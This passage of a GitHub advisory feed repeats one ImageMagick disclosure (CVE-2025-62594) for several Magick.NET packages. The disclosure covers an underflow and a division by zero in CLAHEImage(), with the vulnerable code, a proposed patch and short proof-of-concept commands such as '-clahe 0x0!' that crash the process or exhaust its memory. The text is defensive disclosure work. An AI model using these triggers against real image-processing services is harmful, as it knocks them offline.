                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

ssize_t tile_h_minus1 = (ssize_t)tile_info.height - 1;
if (tile_h_minus1 &lt; 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}
p += (ptrdiff_t) clahe_info-&gt;width * tile_h_minus1;
</code></pre>
<p>Notes about <code>exact_tiles_requested</code>: if the CLI/Wand parser already exposes whether <code>!</code> was present, use it. If not, add a parse-time flag so CLAHEImage can know whether <code>0</code> is literal or auto.</p>
<hr>
<h2 id="credit">Credit</h2>
<h3 id="team-whys">Team Whys</h3>
<p><strong>Bug Hunting Master Program, HSpace/Findthegap</strong></p>
<p><strong>Youngmin Kim</strong> 
<a href="mailto:kunshim@naver.com">kunshim@naver.com</a></p>
<p><strong>Woojin Park</strong></p>
<p><a href="https://github.com/jin-156">@jin-156</a>
<a href="mailto:1203kids@gmail.com">1203kids@gmail.com</a></p>
<p><strong>Youngin Won</strong></p>
<p><a href="https://github.com/amethyst0225">@amethyst0225</a>
<a href="mailto:youngin04@korea.ac.kr">youngin04@korea.ac.kr</a></p>
<p><strong>Siyeon Han</strong></p>
<p><a href="https://github.com/hanbunny">@hanbunny</a>
<a href="mailto:kokosyeon@gmail.com">kokosyeon@gmail.com</a></p>
<p><strong>Shinyoung Won</strong></p>
<p><a href="yosimich123@gmail.com">@yosiimich</a>
<a href="mailto:yosimich123@gmail.com">yosimich123@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62594">https://nvd.nist.gov/vuln/detail/CVE-2025-62594</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129">https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129</a></li>
<li><a href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-27T23:33:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-OpenMP-arm64] ImageMagick CLAHE : Unsigned underflow and division-by-zero lead to OOB pointer arithmetic and process crash (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</id>
        <link href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp"/>
        <updated>2025-10-31T09:29:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A single root cause in the CLAHE implementation — tile width/height becoming zero — produces two distinct but related unsafe behaviors.
Vulnerabilities exists in the <code>CLAHEImage()</code> function of ImageMagick’s <code>MagickCore/enhance.c</code>.</p>
<ol>
<li>Unsigned integer underflow → out-of-bounds pointer arithmetic (OOB): when <code>tile_info.height == 0</code>, the expression <code>tile_info.height - 1</code> (unsigned) wraps to a very large value; using that value in pointer arithmetic yields a huge offset and OOB memory access (leading to memory corruption, SIGSEGV, or resource exhaustion).</li>
<li><strong>Division/modulus by zero</strong>: where code performs <code>... / tile_info.width</code> or <code>... % tile_info.height</code> without re-checking for zero, causing immediate division-by-zero crashes under sanitizers or <code>abort</code> at runtime.</li>
</ol>
<p>Both behaviors are triggered by the same invalid tile condition (e.g., CLI exact <code>-clahe 0x0!</code> or automatic tile derivation <code>dim &gt;&gt; 3 == 0</code> for very small images). </p>
<hr>
<h2 id="details">Details</h2>
<h3 id="unsigned-underflowcan-lea-to-oob"><strong>Unsigned underflow(can lea to OOB)</strong></h3>
<ul>
<li><p>Location: <code>MagickCore/enhance.c</code>, around line 609</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>Vulnerable code</p>
<p>  enhance.c: 609</p>
<pre><code class="language-c">p += (ptrdiff_t) clahe_info-&gt;width * (tile.height - 1);
</code></pre>
</li>
<li><p>Root Cause</p>
<ul>
<li>If <code>tile.height == 0</code>, then <code>(tile.height - 1)</code> underflows to <code>UINT_MAX</code>.</li>
<li>Multiplication with <code>clahe_info-&gt;width</code> yields a huge value close to <code>SIZE_MAX</code>.</li>
<li>Adding this to <code>p</code> causes pointer arithmetic underflow.</li>
</ul>
</li>
</ul>
<h3 id="division-by-zero"><strong>Division-by-zero</strong></h3>
<ul>
<li><p>File / Location: <code>MagickCore/enhance.c</code>, around line 669</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>vulnerable code</p>
<p>  enhance.c: 669-673</p>
<pre><code class="language-c"> if ((image-&gt;columns % tile_info.width) != 0)
    tile_info.x=(ssize_t) (tile_info.width-(image-&gt;columns % tile_info.width));
  tile_info.y=0;
  if ((image-&gt;rows % tile_info.height) != 0)
    tile_info.y=(ssize_t) (tile_info.height-(image-&gt;rows % tile_info.height));
</code></pre>
</li>
<li><p>Root cause</p>
<p>  Missing input validation / bounds checks after computing default tile dimensions:</p>
<p>  If either <code>tile_info.width</code> or <code>tile_info.height</code> is 0, this triggers a division by zero. Zeros can reach this point through:</p>
<ol>
<li>Exact tiles: CLI <code>clahe 0x0!</code> (the <code>!</code> forces zero to be used verbatim).</li>
<li>Auto tiles on tiny images: When a requested tile is <code>0</code> (no <code>!</code>), the code derives a default from the image size (e.g., <code>dim &gt;&gt; 3</code>). For images with <code>dim &lt; 8</code>, this result is 0 unless clamped.</li>
</ol>
</li>
</ul>
<hr>
<h2 id="reproduction">Reproduction</h2>
<h3 id="unsigned-underflow"><strong>Unsigned underflow</strong></h3>
<p><strong>Environment</strong></p>
<p>Built with AddressSanitizer and UndefinedBehaviorSanitizer enabled.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick xc:black -clahe 0x0 null:
</code></pre>
<p><strong>Output</strong></p>
<pre><code>MagickCore/enhance.c:609:6: runtime error: addition of unsigned offset overflowed
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior MagickCore/enhance.c:609:6 in CLAHEImage
</code></pre>
<p><code>./magick -size 10x10 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/cd9637ee-1d03-4066-834d-fda22410dd8b" alt="image" height="64" width="1068">

<p>memory region corruption.</p>
<p><code>./magick -size 2000x2000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/ecbab79c-a3c2-4e8c-96c9-8e2aa8f0d2b2" alt="image" height="70" width="1069">

<p>→ Significant memory consumption and evidence of memory region corruption.</p>
<p><code>./magick -size 4000x4000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/63a7cec5-616b-4aa5-87f3-a546a87e6625" alt="image" height="49" width="776">

<p>→ Much larger memory usage; process appears to be aggressively consuming cache and address space.</p>
<p><code>./magick -size 8000x8000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/48b3aac8-98b3-4fbb-a5ca-4e7936bca44b" alt="image" height="46" width="748">

<p>→ Memory usage escalates further and begins exhausting available cache. If left running, the process is likely to crash (DoS) after sustained allocation attempts.</p>
<h3 id="division-by-zero-1"><strong>Division-by-zero</strong></h3>
<p><strong>Environment:</strong> ASan/UBSan-enabled build.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick -size 16x2 gradient: -type TrueColor -depth 8 -clahe 0x0! null:
</code></pre>
<p><strong>Output</strong></p>
<img src="https://github.com/user-attachments/assets/cfe44432-b429-49e4-8673-2ed55ba9a961" alt="image" height="818" width="1915">

<p><strong>Notes:</strong> Without sanitizers, the process may terminate with just <code>Aborted</code> (still DoS).</p>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li>Primary: Denial-of-Service — crash or sustained resource exhaustion (memory/cache thrash) when processing crafted parameters or small images via CLI or API. Attackers can trivially trigger via <code>clahe 0x0!</code> or by uploading very small images to services using ImageMagick.</li>
<li>Secondary (theoretical): OOB memory accesses and memory corruption could potentially be combined with other vulnerabilities to achieve more severe outcomes; however, no reliable code execution was demonstrated from these PoCs alone.</li>
</ul>
<hr>
<h2 id="suggested-concrete-patch-snippets">Suggested concrete patch snippets</h2>
<p>Apply in <code>CLAHEImage()</code> after <code>tile_info</code> is computed but <strong>before</strong> any division/modulus/pointer arithmetic:</p>
<pre><code class="language-c">if (exact_tiles_requested &amp;&amp; (tile_info.width == 0 || tile_info.height == 0)) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

if (!exact_tiles_requested) {
  tile_info.width  = (tile_info.width  == 0) ? MagickMax((size_t)1, image-&gt;columns &gt;&gt; 3) : tile_info.width;
  tile_info.height = (tile_info.height == 0) ? MagickMax((size_t)1, image-&gt;rows    &gt;&gt; 3) : tile_info.height;
}

if (tile_info.width == 0 || tile_info.height == 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

ssize_t tile_h_minus1 = (ssize_t)tile_info.height - 1;
if (tile_h_minus1 &lt; 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}
p += (ptrdiff_t) clahe_info-&gt;width * tile_h_minus1;
</code></pre>
<p>Notes about <code>exact_tiles_requested</code>: if the CLI/Wand parser already exposes whether <code>!</code> was present, use it. If not, add a parse-time flag so CLAHEImage can know whether <code>0</code> is literal or auto.</p>
<hr>
<h2 id="credit">Credit</h2>
<h3 id="team-whys">Team Whys</h3>
<p><strong>Bug Hunting Master Program, HSpace/Findthegap</strong></p>
<p><strong>Youngmin Kim</strong> 
<a href="mailto:kunshim@naver.com">kunshim@naver.com</a></p>
<p><strong>Woojin Park</strong></p>
<p><a href="https://github.com/jin-156">@jin-156</a>
<a href="mailto:1203kids@gmail.com">1203kids@gmail.com</a></p>
<p><strong>Youngin Won</strong></p>
<p><a href="https://github.com/amethyst0225">@amethyst0225</a>
<a href="mailto:youngin04@korea.ac.kr">youngin04@korea.ac.kr</a></p>
<p><strong>Siyeon Han</strong></p>
<p><a href="https://github.com/hanbunny">@hanbunny</a>
<a href="mailto:kokosyeon@gmail.com">kokosyeon@gmail.com</a></p>
<p><strong>Shinyoung Won</strong></p>
<p><a href="yosimich123@gmail.com">@yosiimich</a>
<a href="mailto:yosimich123@gmail.com">yosimich123@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62594">https://nvd.nist.gov/vuln/detail/CVE-2025-62594</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129">https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129</a></li>
<li><a href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-27T23:33:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-OpenMP-arm64] ImageMagick CLAHE : Unsigned underflow and division-by-zero lead to OOB pointer arithmetic and process crash (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</id>
        <link href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp"/>
        <updated>2025-10-31T09:29:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A single root cause in the CLAHE implementation — tile width/height becoming zero — produces two distinct but related unsafe behaviors.
Vulnerabilities exists in the <code>CLAHEImage()</code> function of ImageMagick’s <code>MagickCore/enhance.c</code>.</p>
<ol>
<li>Unsigned integer underflow → out-of-bounds pointer arithmetic (OOB): when <code>tile_info.height == 0</code>, the expression <code>tile_info.height - 1</code> (unsigned) wraps to a very large value; using that value in pointer arithmetic yields a huge offset and OOB memory access (leading to memory corruption, SIGSEGV, or resource exhaustion).</li>
<li><strong>Division/modulus by zero</strong>: where code performs <code>... / tile_info.width</code> or <code>... % tile_info.height</code> without re-checking for zero, causing immediate division-by-zero crashes under sanitizers or <code>abort</code> at runtime.</li>
</ol>
<p>Both behaviors are triggered by the same invalid tile condition (e.g., CLI exact <code>-clahe 0x0!</code> or automatic tile derivation <code>dim &gt;&gt; 3 == 0</code> for very small images). </p>
<hr>
<h2 id="details">Details</h2>
<h3 id="unsigned-underflowcan-lea-to-oob"><strong>Unsigned underflow(can lea to OOB)</strong></h3>
<ul>
<li><p>Location: <code>MagickCore/enhance.c</code>, around line 609</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>Vulnerable code</p>
<p>  enhance.c: 609</p>
<pre><code class="language-c">p += (ptrdiff_t) clahe_info-&gt;width * (tile.height - 1);
</code></pre>
</li>
<li><p>Root Cause</p>
<ul>
<li>If <code>tile.height == 0</code>, then <code>(tile.height - 1)</code> underflows to <code>UINT_MAX</code>.</li>
<li>Multiplication with <code>clahe_info-&gt;width</code> yields a huge value close to <code>SIZE_MAX</code>.</li>
<li>Adding this to <code>p</code> causes pointer arithmetic underflow.</li>
</ul>
</li>
</ul>
<h3 id="division-by-zero"><strong>Division-by-zero</strong></h3>
<ul>
<li><p>File / Location: <code>MagickCore/enhance.c</code>, around line 669</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>vulnerable code</p>
<p>  enhance.c: 669-673</p>
<pre><code class="language-c"> if ((image-&gt;columns % tile_info.width) != 0)
    tile_info.x=(ssize_t) (tile_info.width-(image-&gt;columns % tile_info.width));
  tile_info.y=0;
  if ((image-&gt;rows % tile_info.height) != 0)
    tile_info.y=(ssize_t) (tile_info.height-(image-&gt;rows % tile_info.height));
</code></pre>
</li>
<li><p>Root cause</p>
<p>  Missing input validation / bounds checks after computing default tile dimensions:</p>
<p>  If either <code>tile_info.width</code> or <code>tile_info.height</code> is 0, this triggers a division by zero. Zeros can reach this point through:</p>
<ol>
<li>Exact tiles: CLI <code>clahe 0x0!</code> (the <code>!</code> forces zero to be used verbatim).</li>
<li>Auto tiles on tiny images: When a requested tile is <code>0</code> (no <code>!</code>), the code derives a default from the image size (e.g., <code>dim &gt;&gt; 3</code>). For images with <code>dim &lt; 8</code>, this result is 0 unless clamped.</li>
</ol>
</li>
</ul>
<hr>
<h2 id="reproduction">Reproduction</h2>
<h3 id="unsigned-underflow"><strong>Unsigned underflow</strong></h3>
<p><strong>Environment</strong></p>
<p>Built with AddressSanitizer and UndefinedBehaviorSanitizer enabled.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick xc:black -clahe 0x0 null:
</code></pre>
<p><strong>Output</strong></p>
<pre><code>MagickCore/enhance.c:609:6: runtime error: addition of unsigned offset overflowed
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior MagickCore/enhance.c:609:6 in CLAHEImage
</code></pre>
<p><code>./magick -size 10x10 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/cd9637ee-1d03-4066-834d-fda22410dd8b" alt="image" height="64" width="1068">

<p>memory region corruption.</p>
<p><code>./magick -size 2000x2000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/ecbab79c-a3c2-4e8c-96c9-8e2aa8f0d2b2" alt="image" height="70" width="1069">

<p>→ Significant memory consumption and evidence of memory region corruption.</p>
<p><code>./magick -size 4000x4000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/63a7cec5-616b-4aa5-87f3-a546a87e6625" alt="image" height="49" width="776">

<p>→ Much larger memory usage; process appears to be aggressively consuming cache and address space.</p>
<p><code>./magick -size 8000x8000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/48b3aac8-98b3-4fbb-a5ca-4e7936bca44b" alt="image" height="46" width="748">

<p>→ Memory usage escalates further and begins exhausting available cache. If left running, the process is likely to crash (DoS) after sustained allocation attempts.</p>
<h3 id="division-by-zero-1"><strong>Division-by-zero</strong></h3>
<p><strong>Environment:</strong> ASan/UBSan-enabled build.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick -size 16x2 gradient: -type TrueColor -depth 8 -clahe 0x0! null:
</code></pre>
<p><strong>Output</strong></p>
<img src="https://github.com/user-attachments/assets/cfe44432-b429-49e4-8673-2ed55ba9a961" alt="image" height="818" width="1915">

<p><strong>Notes:</strong> Without sanitizers, the process may terminate with just <code>Aborted</code> (still DoS).</p>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li>Primary: Denial-of-Service — crash or sustained resource exhaustion (memory/cache thrash) when processing crafted parameters or small images via CLI or API. Attackers can trivially trigger via <code>clahe 0x0!</code> or by uploading very small images to services using ImageMagick.</li>
<li>Secondary (theoretical): OOB memory accesses and memory corruption could potentially be combined with other vulnerabilities to achieve more severe outcomes; however, no reliable code execution was demonstrated from these PoCs alone.</li>
</ul>
<hr>
<h2 id="suggested-concrete-patch-snippets">Suggested concrete patch snippets</h2>
<p>Apply in <code>CLAHEImage()</code> after <code>tile_info</code> is computed but <strong>before</strong> any division/modulus/pointer arithmetic:</p>
<pre><code class="language-c">if (exact_tiles_requested &amp;&amp; (tile_info.width == 0 || tile_info.height == 0)) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

if (!exact_tiles_requested) {
  tile_info.width  = (tile_info.width  == 0) ? MagickMax((size_t)1, image-&gt;columns &gt;&gt; 3) : tile_info.width;
  tile_info.height = (tile_info.height == 0) ? MagickMax((size_t)1, image-&gt;rows    &gt;&gt; 3) : tile_info.height;
}

if (tile_info.width == 0 || tile_info.height == 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

ssize_t tile_h_minus1 = (ssize_t)tile_info.height - 1;
if (tile_h_minus1 &lt; 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}
p += (ptrdiff_t) clahe_info-&gt;width * tile_h_minus1;
</code></pre>
<p>Notes about <code>exact_tiles_requested</code>: if the CLI/Wand parser already exposes whether <code>!</code> was present, use it. If not, add a parse-time flag so CLAHEImage can know whether <code>0</code> is literal or auto.</p>
<hr>
<h2 id="credit">Credit</h2>
<h3 id="team-whys">Team Whys</h3>
<p><strong>Bug Hunting Master Program, HSpace/Findthegap</strong></p>
<p><strong>Youngmin Kim</strong> 
<a href="mailto:kunshim@naver.com">kunshim@naver.com</a></p>
<p><strong>Woojin Park</strong></p>
<p><a href="https://github.com/jin-156">@jin-156</a>
<a href="mailto:1203kids@gmail.com">1203kids@gmail.com</a></p>
<p><strong>Youngin Won</strong></p>
<p><a href="https://github.com/amethyst0225">@amethyst0225</a>
<a href="mailto:youngin04@korea.ac.kr">youngin04@korea.ac.kr</a></p>
<p><strong>Siyeon Han</strong></p>
<p><a href="https://github.com/hanbunny">@hanbunny</a>
<a href="mailto:kokosyeon@gmail.com">kokosyeon@gmail.com</a></p>
<p><strong>Shinyoung Won</strong></p>
<p><a href="yosimich123@gmail.com">@yosiimich</a>
<a href="mailto:yosimich123@gmail.com">yosimich123@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62594">https://nvd.nist.gov/vuln/detail/CVE-2025-62594</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129">https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129</a></li>
<li><a href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-27T23:33:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-arm64] ImageMagick CLAHE : Unsigned underflow and division-by-zero lead to OOB pointer arithmetic and process crash (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</id>
        <link href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp"/>
        <updated>2025-10-31T09:29:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A single root cause in the CLAHE implementation — tile width/height becoming zero — produces two distinct but related unsafe behaviors.
Vulnerabilities exists in the <code>CLAHEImage()</code> function of ImageMagick’s <code>MagickCore/enhance.c</code>.</p>
<ol>
<li>Unsigned integer underflow → out-of-bounds pointer arithmetic (OOB): when <code>tile_info.height == 0</code>, the expression <code>tile_info.height - 1</code> (unsigned) wraps to a very large value; using that value in pointer arithmetic yields a huge offset and OOB memory access (leading to memory corruption, SIGSEGV, or resource exhaustion).</li>
<li><strong>Division/modulus by zero</strong>: where code performs <code>... / tile_info.width</code> or <code>... % tile_info.height</code> without re-checking for zero, causing immediate division-by-zero crashes under sanitizers or <code>abort</code> at runtime.</li>
</ol>
<p>Both behaviors are triggered by the same invalid tile condition (e.g., CLI exact <code>-clahe 0x0!</code> or automatic tile derivation <code>dim &gt;&gt; 3 == 0</code> for very small images). </p>
<hr>
<h2 id="details">Details</h2>
<h3 id="unsigned-underflowcan-lea-to-oob"><strong>Unsigned underflow(can lea to OOB)</strong></h3>
<ul>
<li><p>Location: <code>MagickCore/enhance.c</code>, around line 609</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>Vulnerable code</p>
<p>  enhance.c: 609</p>
<pre><code class="language-c">p += (ptrdiff_t) clahe_info-&gt;width * (tile.height - 1);
</code></pre>
</li>
<li><p>Root Cause</p>
<ul>
<li>If <code>tile.height == 0</code>, then <code>(tile.height - 1)</code> underflows to <code>UINT_MAX</code>.</li>
<li>Multiplication with <code>clahe_info-&gt;width</code> yields a huge value close to <code>SIZE_MAX</code>.</li>
<li>Adding this to <code>p</code> causes pointer arithmetic underflow.</li>
</ul>
</li>
</ul>
<h3 id="division-by-zero"><strong>Division-by-zero</strong></h3>
<ul>
<li><p>File / Location: <code>MagickCore/enhance.c</code>, around line 669</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>vulnerable code</p>
<p>  enhance.c: 669-673</p>
<pre><code class="language-c"> if ((image-&gt;columns % tile_info.width) != 0)
    tile_info.x=(ssize_t) (tile_info.width-(image-&gt;columns % tile_info.width));
  tile_info.y=0;
  if ((image-&gt;rows % tile_info.height) != 0)
    tile_info.y=(ssize_t) (tile_info.height-(image-&gt;rows % tile_info.height));
</code></pre>
</li>
<li><p>Root cause</p>
<p>  Missing input validation / bounds checks after computing default tile dimensions:</p>
<p>  If either <code>tile_info.width</code> or <code>tile_info.height</code> is 0, this triggers a division by zero. Zeros can reach this point through:</p>
<ol>
<li>Exact tiles: CLI <code>clahe 0x0!</code> (the <code>!</code> forces zero to be used verbatim).</li>
<li>Auto tiles on tiny images: When a requested tile is <code>0</code> (no <code>!</code>), the code derives a default from the image size (e.g., <code>dim &gt;&gt; 3</code>). For images with <code>dim &lt; 8</code>, this result is 0 unless clamped.</li>
</ol>
</li>
</ul>
<hr>
<h2 id="reproduction">Reproduction</h2>
<h3 id="unsigned-underflow"><strong>Unsigned underflow</strong></h3>
<p><strong>Environment</strong></p>
<p>Built with AddressSanitizer and UndefinedBehaviorSanitizer enabled.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick xc:black -clahe 0x0 null:
</code></pre>
<p><strong>Output</strong></p>
<pre><code>MagickCore/enhance.c:609:6: runtime error: addition of unsigned offset overflowed
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior MagickCore/enhance.c:609:6 in CLAHEImage
</code></pre>
<p><code>./magick -size 10x10 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/cd9637ee-1d03-4066-834d-fda22410dd8b" alt="image" height="64" width="1068">

<p>memory region corruption.</p>
<p><code>./magick -size 2000x2000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/ecbab79c-a3c2-4e8c-96c9-8e2aa8f0d2b2" alt="image" height="70" width="1069">

<p>→ Significant memory consumption and evidence of memory region corruption.</p>
<p><code>./magick -size 4000x4000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/63a7cec5-616b-4aa5-87f3-a546a87e6625" alt="image" height="49" width="776">

<p>→ Much larger memory usage; process appears to be aggressively consuming cache and address space.</p>
<p><code>./magick -size 8000x8000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/48b3aac8-98b3-4fbb-a5ca-4e7936bca44b" alt="image" height="46" width="748">

<p>→ Memory usage escalates further and begins exhausting available cache. If left running, the process is likely to crash (DoS) after sustained allocation attempts.</p>
<h3 id="division-by-zero-1"><strong>Division-by-zero</strong></h3>
<p><strong>Environment:</strong> ASan/UBSan-enabled build.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick -size 16x2 gradient: -type TrueColor -depth 8 -clahe 0x0! null:
</code></pre>
<p><strong>Output</strong></p>
<img src="https://github.com/user-attachments/assets/cfe44432-b429-49e4-8673-2ed55ba9a961" alt="image" height="818" width="1915">

<p><strong>Notes:</strong> Without sanitizers, the process may terminate with just <code>Aborted</code> (still DoS).</p>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li>Primary: Denial-of-Service — crash or sustained resource exhaustion (memory/cache thrash) when processing crafted parameters or small images via CLI or API. Attackers can trivially trigger via <code>clahe 0x0!</code> or by uploading very small images to services using ImageMagick.</li>
<li>Secondary (theoretical): OOB memory accesses and memory corruption could potentially be combined with other vulnerabilities to achieve more severe outcomes; however, no reliable code execution was demonstrated from these PoCs alone.</li>
</ul>
<hr>
<h2 id="suggested-concrete-patch-snippets">Suggested concrete patch snippets</h2>
<p>Apply in <code>CLAHEImage()</code> after <code>tile_info</code> is computed but <strong>before</strong> any division/modulus/pointer arithmetic:</p>
<pre><code class="language-c">if (exact_tiles_requested &amp;&amp; (tile_info.width == 0 || tile_info.height == 0)) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

if (!exact_tiles_requested) {
  tile_info.width  = (tile_info.width  == 0) ? MagickMax((size_t)1, image-&gt;columns &gt;&gt; 3) : tile_info.width;
  tile_info.height = (tile_info.height == 0) ? MagickMax((size_t)1, image-&gt;rows    &gt;&gt; 3) : tile_info.height;
}

if (tile_info.width == 0 || tile_info.height == 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
